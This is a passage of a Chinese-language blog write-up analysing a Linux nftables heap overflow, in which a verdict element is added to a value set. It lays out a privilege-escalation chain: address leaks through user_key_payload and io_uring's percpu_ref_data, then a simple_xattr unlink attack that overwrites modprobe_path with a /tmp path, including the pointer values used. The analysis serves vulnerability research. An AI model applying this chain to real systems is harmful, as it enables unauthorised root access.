&#123;</span><br>NFTA_SET_ELEM_LIST_UNSPEC,<br>NFTA_SET_ELEM_LIST_TABLE,<br>NFTA_SET_ELEM_LIST_SET,<br>NFTA_SET_ELEM_LIST_ELEMENTS,<br>NFTA_SET_ELEM_LIST_SET_ID,<br>__NFTA_SET_ELEM_LIST_MAX<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFTA_SET_ELEM_LIST_MAX(__NFTA_SET_ELEM_LIST_MAX - 1)</span><br></code></pre></td></tr></table></figure><ul><li><p>nla</p></li><li><p>table</p></li><li><p>set</p></li><li><p>elements，后面会送解析</p></li><li><p>set_id</p></li></ul></li><li><p>接下来就是惯例查找table查找set，调用nft_add_set_elem添加set元素</p></li></ul><h4 id="nft-add-set-elem"><a href="#nft-add-set-elem" class="headerlink" title="nft_add_set_elem"></a>nft_add_set_elem</h4><ul><li><p>进入时的参数attr就是上面的elements，先送解析为nla</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_set_elem_attributes</span> &#123;</span><br>NFTA_SET_ELEM_UNSPEC,<br>NFTA_SET_ELEM_KEY,<br>NFTA_SET_ELEM_DATA,<br>NFTA_SET_ELEM_FLAGS,<br>NFTA_SET_ELEM_TIMEOUT,<br>NFTA_SET_ELEM_EXPIRATION,<br>NFTA_SET_ELEM_USERDATA,<br>NFTA_SET_ELEM_EXPR,<br>NFTA_SET_ELEM_PAD,<br>NFTA_SET_ELEM_OBJREF,<br>NFTA_SET_ELEM_KEY_END,<br>NFTA_SET_ELEM_EXPRESSIONS,<br>__NFTA_SET_ELEM_MAX<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFTA_SET_ELEM_MAX(__NFTA_SET_ELEM_MAX - 1)</span><br></code></pre></td></tr></table></figure><p>只有key有数据，ip地址</p></li><li><p>后面就是nla解析，填入nft_set_elem，这里只有key需要解析，elem.key内容见下</p><p>elem的结构</p><ul><li>key</li><li>key_end</li><li>data</li><li>priv</li></ul><p>前三个成员是一个buf或一个熟悉的nft_data，寄存器也是用这个表示的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_set_elem</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32buf[NFT_DATA_VALUE_MAXLEN / <span class="hljs-keyword">sizeof</span>(u32)];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">val</span>;</span><br>&#125; key;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32buf[NFT_DATA_VALUE_MAXLEN / <span class="hljs-keyword">sizeof</span>(u32)];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">val</span>;</span><br>&#125; key_end;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32buf[NFT_DATA_VALUE_MAXLEN / <span class="hljs-keyword">sizeof</span>(u32)];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span> <span class="hljs-title">val</span>;</span><br>&#125; data;<br><span class="hljs-type">void</span>*priv;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32data[<span class="hljs-number">4</span>];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_verdict</span><span class="hljs-title">verdict</span>;</span><br>&#125;;<br>&#125; __attribute__((aligned(__alignof__(u64))));<br></code></pre></td></tr></table></figure><p>然后key，key_end和data传递给nft_set_elem_init，返回一个priv</p></li></ul><h3 id="tmpl"><a href="#tmpl" class="headerlink" title="tmpl"></a>tmpl</h3><p>tmpl相关数据处理</p><h4 id="nft-add-set-elem-1"><a href="#nft-add-set-elem-1" class="headerlink" title="nft_add_set_elem"></a>nft_add_set_elem</h4><p>nft_set_ext_tmpl结构及相关enum，一个用于准备nft_set_ext结构体的模板结构体，用于记录各个数据的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_set_ext_tmpl</span> &#123;</span><br>u16len;<br>u8offset[NFT_SET_EXT_NUM];<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_set_extensions</span> &#123;</span><br>NFT_SET_EXT_KEY,<br>NFT_SET_EXT_KEY_END,<br>NFT_SET_EXT_DATA,<br>NFT_SET_EXT_FLAGS,<br>NFT_SET_EXT_TIMEOUT,<br>NFT_SET_EXT_EXPIRATION,<br>NFT_SET_EXT_USERDATA,<br>NFT_SET_EXT_EXPRESSIONS,<br>NFT_SET_EXT_OBJREF,<br>NFT_SET_EXT_NUM<br>&#125;;<br></code></pre></td></tr></table></figure><p>先prepare一个tmpl，就是进行一个结构体的初始化，尤其是初始化len</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nft_set_ext_prepare</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_set_ext_tmpl *tmpl)</span><br>&#123;<br><span class="hljs-built_in">memset</span>(tmpl, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*tmpl));<br>tmpl-&gt;len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> nft_set_ext);<br>&#125;<br></code></pre></td></tr></table></figure><p>之后的数据解析都会更新tmpl的长度和对应偏移</p><ul><li><p>调用nft_set_ext_add_length更新</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_KEY, <span class="hljs-built_in">set</span>-&gt;klen);<br>nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_KEY_END, <span class="hljs-built_in">set</span>-&gt;klen);<br>nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_DATA, desc.len);<br>nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_EXPRESSIONS,<br><span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> nft_set_elem_expr) +<br>size);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nft_set_ext_add_length</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_set_ext_tmpl *tmpl, u8 id,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br>tmpl-&gt;len = ALIGN(tmpl-&gt;len, nft_set_ext_types[id].align);<br>BUG_ON(tmpl-&gt;len &gt; U8_MAX);<br>tmpl-&gt;offset[id] = tmpl-&gt;len;<br>tmpl-&gt;len+= nft_set_ext_types[id].len + len;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>调用nft_set_ext_add更新</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">nft_set_ext_add(&amp;tmpl, NFT_SET_EXT_FLAGS);<br>nft_set_ext_add(&amp;tmpl, NFT_SET_EXT_EXPIRATION);<br>nft_set_ext_add(&amp;tmpl, NFT_SET_EXT_TIMEOUT);<br>nft_set_ext_add(&amp;tmpl, NFT_SET_EXT_OBJREF);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nft_set_ext_add</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_set_ext_tmpl *tmpl, u8 id)</span><br>&#123;<br>nft_set_ext_add_length(tmpl, id, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>然后就进入到了nft_set_elem_init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">elem.priv = nft_set_elem_init(<span class="hljs-built_in">set</span>, &amp;tmpl, elem.key.val.data,<br>   elem.key_end.val.data, elem.data.val.data,<br>   timeout, expiration, GFP_KERNEL);<br></code></pre></td></tr></table></figure><h4 id="nft-set-elem-init"><a href="#nft-set-elem-init" class="headerlink" title="nft_set_elem_init"></a>nft_set_elem_init</h4><p>开始填充nft_set_ext</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_set_ext</span> &#123;</span><br>u8genmask;<br>u8offset[NFT_SET_EXT_NUM];<br><span class="hljs-type">char</span>data[];<br>&#125;;<br></code></pre></td></tr></table></figure><p>先申请空间，加的这个elemsize不知道是什么，这时候tmpl-&gt;len包括nft_set_ext结构体头的大小+数据长度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">elem = kzalloc(<span class="hljs-built_in">set</span>-&gt;ops-&gt;elemsize + tmpl-&gt;len, gfp);<br></code></pre></td></tr></table></figure><p>nft_set_ext_init就是在复制offset</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nft_set_ext_init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_set_ext *ext,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_set_ext_tmpl *tmpl)</span><br>&#123;<br><span class="hljs-built_in">memcpy</span>(ext-&gt;offset, tmpl-&gt;offset, <span class="hljs-keyword">sizeof</span>(ext-&gt;offset));<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是复制数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">memcpy</span>(nft_set_ext_key(ext), key, <span class="hljs-built_in">set</span>-&gt;klen);<br><span class="hljs-built_in">memcpy</span>(nft_set_ext_key_end(ext), key_end, <span class="hljs-built_in">set</span>-&gt;klen);<br><span class="hljs-built_in">memcpy</span>(nft_set_ext_data(ext), data, <span class="hljs-built_in">set</span>-&gt;dlen);<br></code></pre></td></tr></table></figure><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>可以看到在处理data的时候</p><ul><li><p>tmpl更新用的是desc.len</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_DATA, desc.len);<br></code></pre></td></tr></table></figure></li><li><p>memcpy使用的是set-&gt;dlen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">memcpy</span>(nft_set_ext_data(ext), data, <span class="hljs-built_in">set</span>-&gt;dlen);<br></code></pre></td></tr></table></figure></li></ul><h3 id="desc-len的赋值"><a href="#desc-len的赋值" class="headerlink" title="desc.len的赋值"></a>desc.len的赋值</h3><p>desc的赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (nla[NFTA_SET_ELEM_DATA] != <span class="hljs-literal">NULL</span>) &#123;<br>err = nft_setelem_parse_data(ctx, <span class="hljs-built_in">set</span>, &amp;desc, &amp;elem.data.val,<br>     nla[NFTA_SET_ELEM_DATA]);<br></code></pre></td></tr></table></figure><p>nft_setelem_parse_data中会检查desc-&gt;len&#x3D;&#x3D;set-&gt;dlen，但如果是verdict则不会进行这个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_setelem_parse_data</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_ctx *ctx, <span class="hljs-keyword">struct</span> nft_set *<span class="hljs-built_in">set</span>,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> nft_data_desc *desc,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> nft_data *data,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> nlattr *attr)</span><br>&#123;<br><span class="hljs-type">int</span> err;<br><br>err = nft_data_init(ctx, data, NFT_DATA_VALUE_MAXLEN, desc, attr);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br><span class="hljs-keyword">if</span> (desc-&gt;type != NFT_DATA_VERDICT &amp;&amp; desc-&gt;len != <span class="hljs-built_in">set</span>-&gt;dlen) &#123;<span class="hljs-comment">// !</span><br>nft_data_release(data, desc-&gt;type);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="set-gt-dlen的赋值"><a href="#set-gt-dlen的赋值" class="headerlink" title="set-&gt;dlen的赋值"></a>set-&gt;dlen的赋值</h3><p>nf_table_newset如果dtype不是verdict可以自定义dlen，只要不超过64，如果是verdict应该是16</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (dtype != NFT_DATA_VERDICT) &#123;<br><span class="hljs-keyword">if</span> (nla[NFTA_SET_DATA_LEN] == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br>desc.dlen = ntohl(nla_get_be32(nla[NFTA_SET_DATA_LEN]));<br><span class="hljs-keyword">if</span> (desc.dlen == <span class="hljs-number">0</span> || desc.dlen &gt; NFT_DATA_VALUE_MAXLEN)<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125; <span class="hljs-keyword">else</span><br>desc.dlen = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> nft_verdict);<br><span class="hljs-comment">// ……</span><br><span class="hljs-built_in">set</span>-&gt;dlen = desc.dlen;<br></code></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>如果往一个NFT_DATA_VALUE的set里添加一个NFT_DATA_VERDICT就可以进行溢出，最多48字节，似乎没有进行type一致的检查</p><ul><li><p>src的data是nft_add_set_elem的栈上的数据，也没有进行初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_set_elem</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32buf[NFT_DATA_VALUE_MAXLEN / <span class="hljs-keyword">sizeof</span>(u32)];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">val</span>;</span><br>&#125; key;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32buf[NFT_DATA_VALUE_MAXLEN / <span class="hljs-keyword">sizeof</span>(u32)];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">val</span>;</span><br>&#125; key_end;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32buf[NFT_DATA_VALUE_MAXLEN / <span class="hljs-keyword">sizeof</span>(u32)];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span> <span class="hljs-title">val</span>;</span><br>&#125; data;<br><span class="hljs-type">void</span>*priv;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>dest是kzalloc得到的堆块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">elem = kzalloc(<span class="hljs-built_in">set</span>-&gt;ops-&gt;elemsize + tmpl-&gt;len, gfp);<br><span class="hljs-comment">// ……</span><br><span class="hljs-keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))<br><span class="hljs-built_in">memcpy</span>(nft_set_ext_data(ext), data, <span class="hljs-built_in">set</span>-&gt;dlen);<br></code></pre></td></tr></table></figure></li></ul><p>可以通过先add一个NFT_DATA_VALUE布置栈上数据，再add一个NFT_DATA_VERDICT就可以保证溢出的数据是可控的</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>漏洞对象的大小取决于用户选项</p><ul><li>20字节的head，elemsize（8）+ nft_set_ext_tmpl（2+9）+ 对齐（1）</li><li>NFT_SET_ELEM_KEY填充28字节</li><li>NFT_DATA_VERDICT填充16字节</li></ul><p>这样elem位于kmalloc-64，可以溢出48字节</p><h2 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h2><h3 id="泄露内核基址"><a href="#泄露内核基址" class="headerlink" title="泄露内核基址"></a>泄露内核基址</h3><p>内核中有一个用于密钥管理的子系统，提供了add_key系统调用进行密钥创建，keyctl系统调用进行密钥的读取、更新、销毁等功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE5(add_key, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _type,<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _description,<br><span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *, _payload,<br><span class="hljs-type">size_t</span>, plen,<br><span class="hljs-type">key_serial_t</span>, ringid)<br></code></pre></td></tr></table></figure><ul><li><p>sys_add_key中会先申请两块临时内存存储从用户空间复制过来的description和payload</p><ul><li><p>description：size &#x3D; 4096</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">description = strndup_user(_description, KEY_MAX_DESC_SIZE);<br></code></pre></td></tr></table></figure></li><li><p>payload：size &#x3D; 用户传来的plen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">payload = kvmalloc(plen, GFP_KERNEL);<br></code></pre></td></tr></table></figure></li></ul></li><li><p>调用key_create_or_update</p><ul><li><p>调用user_preparse其中为payload申请user_key_payload结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ret = index_key.type-&gt;preparse(&amp;prep); <span class="hljs-comment">// user_preparse</span><br></code></pre></td></tr></table></figure></li><li><p>调用key_alloc</p><ul><li><p><strong>申请key结构体（从独立的key_jar中分配）</strong>，这是密钥的主结构体</p></li><li><p>为description申请空间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">key-&gt;index_key.description = kmemdup(desc, desclen + <span class="hljs-number">1</span>, GFP_KERNEL);<br></code></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>最后释放description和payload的临时空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">error3:<br>kvfree_sensitive(payload, plen);<br>error2:<br>kfree(description);<br></code></pre></td></tr></table></figure></li></ul><p>user_key_payload结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_key_payload</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span><span class="hljs-title">rcu</span>;</span><span class="hljs-comment">/* RCU destructor */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>datalen;<span class="hljs-comment">/* length of this data */</span><br><span class="hljs-type">char</span>data[] __aligned(__alignof__(u64)); <span class="hljs-comment">/* actual data */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可以通过改大datalen越界读</p><h3 id="泄露对象"><a href="#泄露对象" class="headerlink" title="泄露对象"></a>泄露对象</h3><p>percpu_ref_data也位于kmalloc-64</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">percpu_ref_data</span> &#123;</span><br><span class="hljs-type">atomic_long_t</span>count;<br><span class="hljs-type">percpu_ref_func_t</span>*release;<br><span class="hljs-type">percpu_ref_func_t</span>*confirm_switch;<br><span class="hljs-type">bool</span>force_atomic:<span class="hljs-number">1</span>;<br><span class="hljs-type">bool</span>allow_reinit:<span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span><span class="hljs-title">rcu</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">percpu_ref</span>*<span class="hljs-title">ref</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>io_uring使用这个结构体，此时</p><ul><li>confirm_switch和release可以泄露内核基址</li><li>ref可以泄露physmap地址</li></ul><p>percpu_ref_data由percpu_ref_init申请，io_ring_ctx_alloc函数申请了这个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __cold <span class="hljs-keyword">struct</span> io_ring_ctx *<span class="hljs-title function_">io_ring_ctx_alloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_uring_params *p)</span><br>&#123;<br><span class="hljs-comment">// ……</span><br><span class="hljs-keyword">if</span> (percpu_ref_init(&amp;ctx-&gt;refs, io_ring_ctx_ref_free,<br>    PERCPU_REF_ALLOW_REINIT, GFP_KERNEL))<br><span class="hljs-keyword">goto</span> err;<br>    <span class="hljs-comment">// ……</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h2><h3 id="simple-xattr"><a href="#simple-xattr" class="headerlink" title="simple_xattr"></a>simple_xattr</h3><p>用于存储in-memory filesystems（tmpfs）的扩展属性（xattrs - extended attribute），通过simple_xattr_alloc申请</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">simple_xattr</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br><span class="hljs-type">char</span> *name;<br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">char</span> value[];<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">next</span>, *<span class="hljs-title">prev</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>kmalloc-32以上</li><li>无法修改，修改会将旧的simple_xattr unlink，再link一个新的上去</li><li>所以不能通过修改next或size进行越界写</li><li>非特权用户无法设置simple_xattr，但系统支持user namespace也可以</li></ul><h3 id="unlinking-attack"><a href="#unlinking-attack" class="headerlink" title="unlinking attack"></a>unlinking attack</h3><p>和堆的unsafe unlink差不多，且内核的double link没有任何检查，只要求next和prev都是合法地址</p><p>unlink的流程无非就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;next-&gt;prev = p-&gt;prev;<br>p-&gt;prev-&gt;next = p-&gt;next;<br></code></pre></td></tr></table></figure><p>我们能够修改p-&gt;next和p-&gt;prev，令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;next = modprobe_path - <span class="hljs-number">8</span> + <span class="hljs-number">1</span>;<span class="hljs-comment">// modeprobe_path : /sbin/modeprobe</span><br>p-&gt;prev = <span class="hljs-number">0xffff</span>xxxx2f706d74;<span class="hljs-comment">// b&#x27;tmp/\xXX\xXX\xff\xff&#x27;</span><br></code></pre></td></tr></table></figure><p>则unlink过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;next-&gt;prev = p-&gt;prev;<span class="hljs-comment">// modeprobe_path : b&#x27;/tmp/\xXX\xXX\xff\xffprobe&#x27;</span><br>p-&gt;prev-&gt;next = p-&gt;next;<span class="hljs-comment">// *0xffffxxxx2f706d74 = modprobe_path - 8 + 1</span><br></code></pre></td></tr></table></figure><p>prev指针的合法地址由physmap提供，及0xffffxxxx2f706d74是一个合法的physmap地址</p><h3 id="识别被覆盖对象"><a 